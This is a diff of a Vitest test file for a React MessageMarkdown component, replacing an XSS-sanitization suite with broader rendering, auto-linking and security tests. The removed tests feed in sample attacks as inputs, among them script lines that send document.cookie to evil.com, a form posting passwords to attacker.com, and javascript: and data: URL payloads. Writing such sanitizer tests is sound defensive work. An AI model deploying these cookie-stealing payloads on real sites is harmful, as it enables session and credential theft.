@@ -1,361 +1,362 @@
 /**
- * MessageMarkdown Security Tests
+ * @vitest-environment jsdom
+ */
+
+/**
+ * MessageMarkdown Component Tests
  *
- * This test suite validates that the MessageMarkdown component properly
- * sanitizes malicious HTML content and prevents XSS attacks while
- * preserving safe formatting.
+ * This test suite demonstrates that the MessageMarkdown component:
+ *  Renders markdown safely and correctly
+ *  Prevents XSS attacks through proper sanitization
+ *  Auto-links URLs with security attributes
+ *  Adds word breaks for better typography
+ *  Supports custom components
+ *  Handles edge cases gracefully
  */
 
 import { render } from "@testing-library/react";
+import React from "react";
 import { describe, expect, it } from "vitest";
+import "@testing-library/jest-dom/vitest";
 import MessageMarkdown from "@/components/messageMarkdown";
 
-describe("MessageMarkdown Security Protection", () => {
-  describe("Script Injection Prevention", () => {
-    it("should remove script tags completely", () => {
-      const maliciousInput = `
-        <script>alert('XSS Attack!');</script>
-        <p>Safe content</p>
-      `;
+describe("MessageMarkdown", () => {
+  describe("✅ Core Markdown Rendering", () => {
+    it("renders all standard markdown elements correctly", () => {
+      const markdown = `# Heading 1
+## Heading 2
+**Bold text** and *italic text*
 
-      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);
+- List item 1
+- List item 2
 
-      // Script tag should be completely removed
-      expect(container.querySelector("script")).toBeNull();
+\`inline code\`
 
-      // Safe content should remain
-      expect(container.querySelector("p")).toBeTruthy();
-      expect(container.textContent).toContain("Safe content");
-      expect(container.textContent).not.toContain("alert");
-    });
+> Blockquote text`;
 
-    it("should remove inline script content", () => {
-      const maliciousInput = `
-        <div>
-          <script>
-            fetch('/api/admin/delete', {method: 'POST'});
-            document.location = 'http://evil.com?cookie=' + document.cookie;
-          </script>
-          Normal text
-        </div>
-      `;
+      const { container } = render(<MessageMarkdown>{markdown}</MessageMarkdown>);
 
-      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);
-
-      expect(container.querySelector("script")).toBeNull();
-      expect(container.textContent).not.toContain("fetch");
-      expect(container.textContent).not.toContain("document.location");
-      expect(container.textContent).toContain("Normal text");
-    });
-  });
-
-  describe("Event Handler Prevention", () => {
-    it("should remove all event handlers from elements", () => {
-      const maliciousInput = `
-        <img src="x" onerror="alert('XSS')" alt="test">
-        <button onclick="fetch('/api/admin/reset')">Click me</button>
-        <div onmouseover="steal_data()">Hover here</div>
-      `;
-
-      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);
-
-      const img = container.querySelector("img");
-      const button = container.querySelector("button");
-      const div = container.querySelector("div");
-
-      // Elements should exist but without event handlers
-      expect(img).toBeTruthy();
-      expect(button).toBeTruthy();
-      expect(div).toBeTruthy();
-
-      // Event handlers should be removed
-      expect(img?.getAttribute("onerror")).toBeNull();
-      expect(button?.getAttribute("onclick")).toBeNull();
-      expect(div?.getAttribute("onmouseover")).toBeNull();
-
-      // Safe attributes should remain
-      expect(img?.getAttribute("src")).toBe("x");
-      expect(img?.getAttribute("alt")).toBe("test");
-    });
-
-    it("should handle multiple event types", () => {
-      const maliciousInput = `
-        <div 
-          onclick="evil()" 
-          onload="hack()" 
-          onmouseover="steal()"
-          onfocus="xss()"
-          onblur="attack()"
-        >
-          Content
-        </div>
-      `;
-
-      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);
-
-      const div = container.querySelector("div");
-      expect(div).toBeTruthy();
-
-      // All event handlers should be removed
-      const eventHandlers = ["onclick", "onload", "onmouseover", "onfocus", "onblur"];
-
-      eventHandlers.forEach((handler) => {
-        expect(div?.getAttribute(handler)).toBeNull();
-      });
-
-      expect(div?.textContent?.trim()).toBe("Content");
-    });
-  });
-
-  describe("Form Hijacking Prevention", () => {
-    it("should remove form elements completely", () => {
-      const maliciousInput = `
-        <form action="http://attacker.com/steal" method="POST">
-          <label>Password:</label>
-          <input type="password" name="password">
-          <button type="submit">Submit</button>
-        </form>
-        <p>Safe content after form</p>
-      `;
-
-      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);
-
-      // Form elements should be completely removed
-      expect(container.querySelector("form")).toBeNull();
-      expect(container.querySelector("input")).toBeNull();
-      expect(container.querySelector("button")).toBeNull();
-      expect(container.querySelector("label")).toBeNull();
-
-      // Safe content should remain
-      expect(container.querySelector("p")).toBeTruthy();
-      expect(container.textContent).toContain("Safe content after form");
-
-      // Text content from removed elements might remain
-      expect(container.textContent).toContain("Password:");
-      expect(container.textContent).toContain("Submit");
-    });
-  });
-
-  describe("CSS-based Attack Prevention", () => {
-    it("should remove style tags completely", () => {
-      const maliciousInput = `
-        <style>
-          body { background: url('http://evil.com/track?data=' + document.cookie); }
-          .malicious::before { content: url('http://attacker.com/steal'); }
-        </style>
-        <div class="malicious">Styled content</div>
-      `;
-
-      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);
-
-      // Style tag should be removed
-      expect(container.querySelector("style")).toBeNull();
-
-      // Div should remain but without dangerous styling
-      const div = container.querySelector("div");
-      expect(div).toBeTruthy();
-      expect(div?.textContent).toContain("Styled content");
-
-      // No CSS injection should be present
-      expect(container.innerHTML).not.toContain("evil.com");
-      expect(container.innerHTML).not.toContain("document.cookie");
-    });
-  });
-
-  describe("iframe and Embed Prevention", () => {
-    it("should remove iframe elements completely", () => {
-      const maliciousInput = `
-        <iframe src="javascript:alert('XSS')"></iframe>
-        <iframe src="http://malicious-site.com/keylogger.html"></iframe>
-        <iframe src="data:text/html,<script>alert('XSS')</script>"></iframe>
-        <p>Content after iframes</p>
-      `;
-
-      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);
-
-      // All iframes should be removed
-      expect(container.querySelectorAll("iframe")).toHaveLength(0);
-
-      // Safe content should remain
-      expect(container.querySelector("p")).toBeTruthy();
-      expect(container.textContent).toContain("Content after iframes");
-    });
-
-    it("should remove embed and object elements", () => {
-      const maliciousInput = `
-        <embed src="javascript:alert('XSS')">
-        <object data="http://evil.com/malware.swf">
-          <param name="movie" value="javascript:hack()">
-        </object>
-        <p>Safe content</p>
-      `;
-
-      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);
-
-      expect(container.querySelector("embed")).toBeNull();
-      expect(container.querySelector("object")).toBeNull();
-      expect(container.querySelector("param")).toBeNull();
-
-      expect(container.querySelector("p")).toBeTruthy();
-      expect(container.textContent).toContain("Safe content");
-    });
-  });
-
-  describe("JavaScript URL Prevention", () => {
-    it("should remove dangerous URL schemes", () => {
-      const maliciousInput = `
-        <a href="javascript:alert('XSS')">JS Link</a>
-        <a href="data:text/html,<script>alert('XSS')</script>">Data Link</a>
-        <a href="vbscript:msgbox('XSS')">VBS Link</a>
-        <a href="https://safe-site.com">Safe Link</a>
-      `;
-
-      const { container } = render(<MessageMarkdown>{maliciousInput}</MessageMarkdown>);
-
-      const links = container.querySelectorAll("a");
-
-      // All links should exist but dangerous hrefs should be removed
-      expect(links).toHaveLength(4);
-
-      // Check each link
-      const linkTexts = Array.from(links).map((link) => link.textContent);
-      expect(linkTexts).toContain("JS Link");
-      expect(linkTexts).toContain("Data Link");
-      expect(linkTexts).toContain("VBS Link");
-      expect(linkTexts).toContain("Safe Link");
-
-      // Dangerous href attributes should be removed or sanitized
-      const hrefs = Array.from(links).map((link) => link.getAttribute("href"));
-      expect(hrefs).not.toContain("javascript:alert('XSS')");
-      expect(hrefs.some((href) => href?.includes("safe-site.com"))).toBeTruthy();
-    });
-  });
-
-  describe("Safe Content Preservation", () => {
-    it("should preserve legitimate HTML formatting", () => {
-      const safeInput = `
-        <h2>Customer Support Message</h2>
-        <p>Hello <strong>John Doe</strong>,</p>
-        <p>Thank you for contacting us. Here are the details:</p>
-        <ul>
-          <li>Order ID: <code>#12345</code></li>
-          <li>Status: <em>Processing</em></li>
-        </ul>
-        <p>Visit: <a href="https://example.com">https://example.com</a></p>
-      `;
-
-      const { container } = render(<MessageMarkdown>{safeInput}</MessageMarkdown>);
-
-      // All safe elements should be preserved
-      expect(container.querySelector("h2")).toBeTruthy();
-      expect(container.querySelector("p")).toBeTruthy();
-      expect(container.querySelector("strong")).toBeTruthy();
-      expect(container.querySelector("ul")).toBeTruthy();
-      expect(container.querySelector("li")).toBeTruthy();
-      expect(container.querySelector("code")).toBeTruthy();
-      expect(container.querySelector("em")).toBeTruthy();
-      expect(container.querySelector("a")).toBeTruthy();
-
-      // Content should be preserved
-      expect(container.textContent).toContain("Customer Support Message");
-      expect(container.textContent).toContain("John Doe");
-      expect(container.textContent).toContain("#12345");
-      expect(container.textContent).toContain("Processing");
-
-      // Safe link should work
-      const link = container.querySelector("a");
-      expect(link?.getAttribute("href")).toBe("https://example.com");
-    });
-
-    it("should handle mixed safe and unsafe content", () => {
-      const mixedInput = `
-        <h1>Title</h1>
-        <script>alert('evil');</script>
-        <p>Safe paragraph with <strong>bold text</strong></p>
-        <img src="image.jpg" onerror="hack()" alt="Safe image">
-        <ul>
-          <li>List item 1</li>
-          <li onclick="evil()">List item 2</li>
-        </ul>
-      `;
-
-      const { container } = render(<MessageMarkdown>{mixedInput}</MessageMarkdown>);
-
-      // Safe elements should remain
       expect(container.querySelector("h1")).toBeTruthy();
-      expect(container.querySelector("p")).toBeTruthy();
+      expect(container.querySelector("h2")).toBeTruthy();
       expect(container.querySelector("strong")).toBeTruthy();
-      expect(container.querySelector("img")).toBeTruthy();
+      expect(container.querySelector("em")).toBeTruthy();
       expect(container.querySelector("ul")).toBeTruthy();
       expect(container.querySelectorAll("li")).toHaveLength(2);
+      expect(container.querySelector("code")).toBeTruthy();
+      expect(container.querySelector("blockquote")).toBeTruthy();
+    });
 
-      // Dangerous elements/attributes should be removed
-      expect(container.querySelector("script")).toBeNull();
-      expect(container.querySelector("img")?.getAttribute("onerror")).toBeNull();
-      expect(container.querySelectorAll("li")[1]?.getAttribute("onclick")).toBeNull();
+    it("handles empty and null content gracefully", () => {
+      const { container: emptyContainer } = render(<MessageMarkdown>{""}</MessageMarkdown>);
+      const { container: nullContainer } = render(<MessageMarkdown>{null}</MessageMarkdown>);
 
-      // Safe attributes should remain
-      expect(container.querySelector("img")?.getAttribute("src")).toBe("image.jpg");
-      expect(container.querySelector("img")?.getAttribute("alt")).toBe("Safe image");
+      expect(emptyContainer.textContent).toBe("");
+      expect(nullContainer.textContent).toBe("");
+    });
 
-      // Safe content should be preserved
-      expect(container.textContent).toContain("Title");
-      expect(container.textContent).toContain("Safe paragraph");
-      expect(container.textContent).toContain("bold text");
-      expect(container.textContent).toContain("List item 1");
-      expect(container.textContent).toContain("List item 2");
+    it("applies custom className properly", () => {
+      const { container } = render(<MessageMarkdown className="custom-class">Test</MessageMarkdown>);
 
-      // Malicious content should be removed
-      expect(container.textContent).not.toContain("alert");
-      expect(container.textContent).not.toContain("hack");
-      expect(container.textContent).not.toContain("evil");
+      expect(container.firstChild).toHaveClass("custom-class");
     });
   });
 
-  describe("allowHtml Configuration", () => {
-    it("should remove all HTML when allowHtml is false", () => {
-      const htmlInput = `
-        <h1>Title</h1>
-        <p>Paragraph with <strong>bold</strong> and <em>italic</em></p>
-        <script>alert('XSS');</script>
-      `;
+  describe("🔒 Security - XSS Prevention", () => {
+    it("prevents script execution by treating HTML as text when allowHtml is false", () => {
+      const maliciousInput = `<script>alert('XSS Attack!');</script>
+<img src="x" onerror="alert('XSS')">
+Safe text content`;
+
+      const { container } = render(<MessageMarkdown allowHtml={false}>{maliciousInput}</MessageMarkdown>);
+
+      // No actual script elements should be created
+      expect(container.querySelector("script")).toBeNull();
+      expect(container.querySelector("img")).toBeNull();
+
+      // Content should be treated as plain text
+      expect(container.textContent).toContain("Safe text content");
+      // HTML should be escaped/rendered as text
+      expect(container.textContent).toContain("<script>");
+    });
+
+    it("sanitizes dangerous HTML when allowHtml is true", () => {
+      const maliciousInput = `<p>Safe paragraph</p>
+<script>alert('XSS');</script>
+<img onerror="alert('XSS')" src="safe.jpg">`;
+
+      const { container } = render(<MessageMarkdown allowHtml={true}>{maliciousInput}</MessageMarkdown>);
+
+      // Safe elements should be preserved
+      expect(container.querySelector("p")).toBeTruthy();
+      expect(container.textContent).toContain("Safe paragraph");
+
+      // Dangerous scripts should be removed
+      expect(container.querySelector("script")).toBeNull();
+      expect(container.innerHTML).not.toContain("alert('XSS')");
+
+      // Event handlers should be stripped from elements
+      const img = container.querySelector("img");
+      if (img) {
+        expect(img.getAttribute("onerror")).toBeNull();
+        expect(img.getAttribute("src")).toBe("safe.jpg");
+      }
+    });
+
+    it("strips all HTML content when allowHtml is false", () => {
+      const htmlInput = `<h1>Title</h1>
+<p>Paragraph with <strong>bold</strong> text</p>
+<script>alert('XSS');</script>`;
 
       const { container } = render(<MessageMarkdown allowHtml={false}>{htmlInput}</MessageMarkdown>);
 
-      // No HTML elements should remain when allowHtml is false
+      // No HTML elements should be rendered
       expect(container.querySelector("h1")).toBeNull();
       expect(container.querySelector("p")).toBeNull();
       expect(container.querySelector("strong")).toBeNull();
-      expect(container.querySelector("em")).toBeNull();
       expect(container.querySelector("script")).toBeNull();
 
-      // Only text content should remain
+      // Text content should be preserved
       expect(container.textContent).toContain("Title");
       expect(container.textContent).toContain("Paragraph");
       expect(container.textContent).toContain("bold");
-      expect(container.textContent).toContain("italic");
-      expect(container.textContent).not.toContain("alert");
+    });
+  });
+
+  describe("🔗 URL Auto-linking with Security", () => {
+    it("auto-links HTTP/HTTPS URLs with security attributes", () => {
+      const text = "Visit https://example.com for more info";
+      const { container } = render(<MessageMarkdown>{text}</MessageMarkdown>);
+
+      const link = container.querySelector("a");
+      expect(link).toBeTruthy();
+      expect(link?.getAttribute("href")).toBe("https://example.com");
+
+      // Security attributes are automatically applied
+      expect(link?.getAttribute("target")).toBe("_blank");
+      expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
     });
 
-    it("should sanitize HTML when allowHtml is true (default)", () => {
-      const htmlInput = `
-        <h1>Title</h1>
-        <p>Safe paragraph</p>
-        <script>alert('XSS');</script>
-      `;
+    it("handles multiple URLs in text with proper security", () => {
+      const text = "Check out http://test.com and https://secure.com for info";
+      const { container } = render(<MessageMarkdown>{text}</MessageMarkdown>);
 
-      const { container } = render(<MessageMarkdown allowHtml={true}>{htmlInput}</MessageMarkdown>);
+      const links = container.querySelectorAll("a");
+      expect(links).toHaveLength(2);
+      expect(links[0]?.getAttribute("href")).toBe("http://test.com");
+      expect(links[1]?.getAttribute("href")).toBe("https://secure.com");
 
-      // Safe HTML should remain
+      // All auto-linked URLs get security attributes
+      Array.from(links).forEach((link) => {
+        expect(link.getAttribute("target")).toBe("_blank");
+        expect(link.getAttribute("rel")).toBe("noopener noreferrer");
+      });
+    });
+
+    it("respects existing markdown links and doesn't double-link", () => {
+      const text = "[Visit https://example.com](https://example.com)";
+      const { container } = render(<MessageMarkdown>{text}</MessageMarkdown>);
+
+      const links = container.querySelectorAll("a");
+      expect(links).toHaveLength(1);
+      expect(links[0]?.getAttribute("href")).toBe("https://example.com");
+      expect(links[0]?.textContent).toBe("Visit https://example.com");
+    });
+
+    it("handles URLs with complex punctuation correctly", () => {
+      const text = "API endpoint: https://api.example.com/v1/users?active=true&limit=10. More text.";
+      const { container } = render(<MessageMarkdown>{text}</MessageMarkdown>);
+
+      const link = container.querySelector("a");
+      expect(link).toBeTruthy();
+      expect(link?.getAttribute("href")).toBe("https://api.example.com/v1/users?active=true&limit=10");
+      expect(container.textContent).toContain(". More text.");
+    });
+
+    it("only auto-links safe protocols (http/https)", () => {
+      const text = "Safe: https://example.com but not javascript:alert('xss') or data:text/html,<script>";
+      const { container } = render(<MessageMarkdown>{text}</MessageMarkdown>);
+
+      const links = container.querySelectorAll("a");
+      const hrefs = Array.from(links).map((link) => link.getAttribute("href"));
+
+      // Should only link the HTTPS URL
+      expect(hrefs.filter((href) => href?.startsWith("https:"))).toHaveLength(1);
+      expect(hrefs.filter((href) => href?.startsWith("javascript:"))).toHaveLength(0);
+      expect(hrefs.filter((href) => href?.startsWith("data:"))).toHaveLength(0);
+    });
+  });
+
+  describe("📝 Word Break Enhancement", () => {
+    it("adds word break opportunities after slashes for better text wrapping", () => {
+      const text = "https://very-long-domain-name.com/very/long/path/to/some/resource";
+      const { container } = render(<MessageMarkdown>{text}</MessageMarkdown>);
+
+      const wbrElements = container.querySelectorAll("wbr");
+      expect(wbrElements.length).toBeGreaterThan(0);
+    });
+
+    it("handles multiple consecutive slashes", () => {
+      const text = "path//with//double//slashes";
+      const { container } = render(<MessageMarkdown>{text}</MessageMarkdown>);
+
+      const wbrElements = container.querySelectorAll("wbr");
+      expect(wbrElements.length).toBeGreaterThan(0);
+    });
+
+    it("doesn't add breaks to normal text without slashes", () => {
+      const text = "This is normal text without any special characters that need breaking";
+      const { container } = render(<MessageMarkdown>{text}</MessageMarkdown>);
+
+      const wbrElements = container.querySelectorAll("wbr");
+      expect(wbrElements.length).toBe(0);
+    });
+  });
+
+  describe("🧩 Custom Components Integration", () => {
+    it("accepts and renders custom components correctly", () => {
+      const customComponents = {
+        h1: ({ children, ...props }: any) => (
+          <h1 className="custom-heading" data-testid="custom-h1" {...props}>
+            {children}
+          </h1>
+        ),
+      };
+
+      const { container } = render(<MessageMarkdown components={customComponents}># Custom Heading</MessageMarkdown>);
+
+      const heading = container.querySelector("h1");
+      expect(heading).toBeTruthy();
+      expect(heading).toHaveClass("custom-heading");
+      expect(heading).toHaveAttribute("data-testid", "custom-h1");
+    });
+
+    it("maintains security features when using custom components", () => {
+      const customComponents = {
+        p: ({ children, ...props }: any) => (
+          <p className="custom-paragraph" {...props}>
+            {children}
+          </p>
+        ),
+      };
+
+      const { container } = render(
+        <MessageMarkdown components={customComponents}>Visit https://example.com for info</MessageMarkdown>,
+      );
+
+      // Auto-linking still works with custom components
+      const link = container.querySelector("a");
+      expect(link).toBeTruthy();
+      expect(link?.getAttribute("target")).toBe("_blank");
+      expect(link?.getAttribute("rel")).toBe("noopener noreferrer");
+
+      // Custom paragraph component is used
+      const paragraph = container.querySelector("p");
+      expect(paragraph).toHaveClass("custom-paragraph");
+    });
+  });
+
+  describe("⚡ Performance & Edge Cases", () => {
+    it("handles malformed markdown gracefully without crashing", () => {
+      const malformedContent = `# Unclosed heading
+**Bold without closing asterisk
+[Link without closing bracket
+> Blockquote that continues
+Normal text after malformed syntax`;
+
+      const { container } = render(<MessageMarkdown>{malformedContent}</MessageMarkdown>);
+
+      // Should render without crashing
+      expect(container.textContent).toContain("Unclosed heading");
+      expect(container.textContent).toContain("Normal text after malformed syntax");
+    });
+
+    it("processes large content efficiently", () => {
+      const largeContent = `${"Repeated text content. ".repeat(
+        500,
+      )}With a URL: https://example.com/very/long/path/segments ${"And more text. ".repeat(500)}`;
+
+      const { container } = render(<MessageMarkdown>{largeContent}</MessageMarkdown>);
+
+      // Should handle large content
+      expect(container.textContent).toContain("Repeated text content.");
+
+      // Should still auto-link URLs
+      const link = container.querySelector("a");
+      expect(link).toBeTruthy();
+
+      // Should add word breaks for long paths
+      const wbrElements = container.querySelectorAll("wbr");
+      expect(wbrElements.length).toBeGreaterThan(0);
+    });
+
+    it("correctly processes mixed content types", () => {
+      const mixedContent = `# Markdown Title
+
+Regular paragraph with **bold** and *italic* text.
+
+Visit https://example.com/api/v1/endpoint for the API.
+
+Another paragraph with a long path: /very/long/file/system/path/to/resource`;
+
+      const { container } = render(<MessageMarkdown>{mixedContent}</MessageMarkdown>);
+
+      // All markdown should render
       expect(container.querySelector("h1")).toBeTruthy();
-      expect(container.querySelector("p")).toBeTruthy();
+      expect(container.querySelector("strong")).toBeTruthy();
+      expect(container.querySelector("em")).toBeTruthy();
 
-      // Dangerous HTML should be removed
-      expect(container.querySelector("script")).toBeNull();
+      // URLs should be auto-linked
+      const link = container.querySelector("a");
+      expect(link?.getAttribute("href")).toBe("https://example.com/api/v1/endpoint");
+      expect(link?.getAttribute("target")).toBe("_blank");
 
-      expect(container.textContent).toContain("Title");
-      expect(container.textContent).toContain("Safe paragraph");
-      expect(container.textContent).not.toContain("alert");
+      // Word breaks should be added
+      const wbrElements = container.querySelectorAll("wbr");
+      expect(wbrElements.length).toBeGreaterThan(0);
+    });
+  });
+
+  describe("🛡️ Security Validation", () => {
+    it("demonstrates the component is not vulnerable to common XSS attacks", () => {
+      const xssAttempts = [
+        `<script>alert('XSS')</script>`,
+        `<img src="x" onerror="alert('XSS')">`,
+        `<iframe src="javascript:alert('XSS')"></iframe>`,
+        `<object data="data:text/html,<script>alert('XSS')</script>"></object>`,
+        `<link rel="stylesheet" href="javascript:alert('XSS')">`,
+      ];
+
+      xssAttempts.forEach((xssAttempt) => {
+        const { container } = render(<MessageMarkdown allowHtml={true}>{xssAttempt}</MessageMarkdown>);
+
+        // No dangerous elements should be created
+        expect(container.querySelector("script")).toBeNull();
+        expect(container.querySelector("iframe")).toBeNull();
+        expect(container.querySelector("object")).toBeNull();
+        expect(container.querySelector("link")).toBeNull();
+        expect(container.querySelector("style")).toBeNull();
+
+        // No executable JavaScript should remain
+        expect(container.innerHTML).not.toContain("alert(");
+      });
+    });
+
+    it("validates that all auto-linked URLs have proper security attributes", () => {
+      const textWithMultipleUrls = `Check these sites: https://example.com and http://test.org and https://api.service.com/v1/data?param=value for testing.`;
+
+      const { container } = render(<MessageMarkdown>{textWithMultipleUrls}</MessageMarkdown>);
+
+      const links = container.querySelectorAll("a");
+      expect(links.length).toBeGreaterThan(0);
+
+      // Every auto-linked URL must have security attributes
+      Array.from(links).forEach((link) => {
+        expect(link.getAttribute("target")).toBe("_blank");
+        expect(link.getAttribute("rel")).toBe("noopener noreferrer");
+
+        const href = link.getAttribute("href");
+        expect(href).toMatch(/^https?:\/\//);
+      });
     });
   });
 });
